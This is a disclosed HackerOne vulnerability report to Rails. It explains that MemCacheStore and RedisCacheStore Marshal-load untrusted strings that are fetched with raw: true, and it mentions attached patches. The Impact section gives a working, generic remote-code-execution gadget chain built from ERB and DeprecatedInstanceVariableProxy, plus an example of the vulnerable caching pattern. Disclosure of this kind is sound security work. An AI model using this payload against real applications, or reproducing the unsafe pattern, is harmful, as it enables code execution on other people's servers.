# Untrusted strings that are cache fetched with raw option are automatically marshal loaded

## Report Details
- **Report ID**: 413388
- **URL**: https://hackerone.com/reports/413388
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-09-24T12:58:49.441Z
- **Disclosed**: 2020-05-26T22:38:29.197Z

## Reporter
- **Username**: dylan-ts
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
This vulnerability effects application code that caches a string from an untrusted source using the `raw: true` option. For example, vulnerable application code might looks something like the following

```ruby
body = Rails.cache.fetch(key, raw: true, expires_in: ttl) do
  res = Net::HTTP.get_response(remote_uri)
  res.value # raise on HTTP error
  res.body
end
```

where `res.body` represents the untrusted string in the example above.  The below script shows that an untrusted string in the Marshal format will be deserialized when read using `raw: true`.

```ruby
require 'rails/all'

untrusted_string = Marshal.dump(:sym)

cache = ActiveSupport::Cache::MemCacheStore.new('localhost')
cache.delete("demo")
data = cache.fetch("demo", raw: true) { untrusted_string }
p data # "\x04\b:\bsym"
data = cache.fetch("demo", raw: true)
p data # :sym
```

This vulnerability appears to have been around for a long time, so would affect all currently supported versions of rails. I've tested with the earliest and latest supported rails version, 4.2.10 and 5.2.1 and both are affected.

The vulnerability affects both MemCacheStore and RedisCacheStore cache backends that are a part of rails, but cache stores developed outside of rails could also be vulnerable. For instance, the memcached_store has the same vulnerability as a result of replicating the behaviour of MemCacheStore.

I've attached patches to fix MemCacheStore and RedisCacheStore on master.  I believe the MemCacheStore patch can be backported, since Dalli uses memcached's flags to tag keys that need marshal loading (since [Dalli version 0.11.0](https://github.com/petergoldstein/dalli/blob/master/History.md#0110)) so can avoid unmarshalling raw strings.  However, backporting RedisCacheStore could cause backwards compatibility problems with application code that writes and reads a cache key with a different raw option value, so I've included a patch to deprecate that usage in rails 5.2.

## Impact

As has been demonstrated in the past, Marshal.load of an untrusted string can lead to remote code execution when done in rails without any reliance on application code.

The following script demonstrates that this is still the case and shows that a generic exploit payload can be used.

```ruby
require 'erb'
require 'rails/all'

remote_code = <<-RUBY
puts 'HACKED'
RUBY

erb = ERB.allocate
erb.instance_variable_set(:@src, remote_code)
erb.instance_variable_set(:@lineno, 0)
deprecation = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)
exploit_data = Marshal.dump(deprecation)

obj = Marshal.load(exploit_data)
obj.is_a?(ActiveSupport::Cache::Entry)
```

So a generic exploit payload could be provided to applications to try to find if the application stores and fetches raw strings from the cache.

## Attachments
- 0001-master-MemCacheStore-patch.diff.txt
- 0002-master-RedisCacheStore-patch.diff.txt
- 0002-rails-5.2-deprecate-marshal-load-on-raw-cache-values.diff.txt
